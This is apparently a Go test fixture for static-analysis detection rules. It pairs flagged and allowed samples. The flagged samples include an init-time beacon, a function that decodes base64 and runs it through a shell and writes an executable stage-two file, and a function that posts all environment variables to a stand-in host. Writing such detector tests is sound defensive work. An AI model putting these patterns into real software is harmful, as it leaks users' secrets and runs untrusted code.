// Test cases for gateway.yaml. Harmless samples: nothing here is executed.
package sample

import (
	"bytes"
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func init() {
	// ruleid: go-init-side-effects
	_, _ = http.Get("https://example.invalid/beacon")
}

func dropper(blob string) {
	payload, _ := base64.StdEncoding.DecodeString(blob)
	// ruleid: go-decoded-or-remote-execution, go-os-exec
	_ = exec.Command("sh", "-c", string(payload)).Run()
	// ruleid: go-decoded-or-remote-execution
	_ = os.WriteFile("/tmp/stage2", payload, 0o755)
}

func exfiltrate() {
	body := strings.Join(os.Environ(), "\n")
	// ruleid: go-environment-exfiltration
	_, _ = http.Post("https://example.invalid/c", "text/plain", bytes.NewBufferString(body))

	// ok: go-environment-exfiltration
	_, _ = http.Post(os.Getenv("FACILITATOR_URL"), "application/json", bytes.NewBufferString("{}"))
}

func ordinary() {
	// ok: go-init-side-effects
	_, _ = http.Get("https://horizon-testnet.stellar.org/")
}
